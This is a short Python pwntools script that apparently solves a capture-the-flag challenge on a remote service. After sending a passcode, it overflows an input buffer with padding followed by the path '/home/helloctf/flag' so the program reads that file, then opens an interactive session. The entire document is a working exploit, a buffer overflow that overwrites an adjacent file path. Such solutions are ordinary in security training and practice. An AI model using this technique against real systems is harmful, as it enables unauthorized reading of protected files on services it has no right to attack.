from pwn import *
context.arch = 'amd64'
host = "ctf.adl.tw"
port = 11005
r = remote(host, port)
#r = process("./recorder")
r.recvuntil(b'Enter your passcode:')
r.send(b"A"*4)
r.recvuntil(b"Provide the result in CSV format:")
attack = "A" * 0x14 + "/home/helloctf/flag"
r.send(attack)
r.recv()
r.interactive()